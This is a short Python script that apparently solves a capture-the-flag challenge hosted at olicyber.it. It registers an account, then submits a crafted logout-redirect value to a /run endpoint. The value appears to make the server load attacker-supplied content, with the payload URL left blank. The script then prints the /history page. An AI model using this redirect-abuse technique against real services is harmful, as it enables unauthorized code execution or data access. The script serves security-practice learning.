import requests

base_url = "http://cloud_free_tier.challs.olicyber.it/login"
payload_url = ""

username = "yourusername"
password = "yourpassword"

s = requests.Session()

s.post(f'{base_url}/register', data={
    'username':username,
    'password':password
})

s.post(f'{base_url}/run', data={
    'file':f'/logout?redirect={payload_url}'
})

r = s.get(f'{base_url}/history')

print(r.text)
